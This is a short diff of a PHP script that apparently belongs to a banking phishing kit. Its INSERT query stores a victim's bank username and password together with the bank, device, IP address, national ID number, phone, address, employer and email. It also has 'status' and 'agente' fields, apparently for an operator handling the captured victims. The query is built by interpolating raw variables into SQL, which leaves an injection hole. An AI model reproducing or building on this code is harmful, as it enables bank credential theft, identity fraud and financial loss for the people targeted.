@@ -61,8 +61,8 @@ if ($con = conectar()) {
         }
 
         // 🟢 CORRECCIÓN AQUÍ: Se guarda el $mnt en `valor_factura` y se deja `agente` en blanco. El estado se mantiene en 12.
-        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, valor_factura, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email) 
-                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 12, '', '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
+        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, valor_factura, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email)
+                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 1, '', '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
         sentencia($con, $query_insert);
         
         $id = mysqli_insert_id($con);
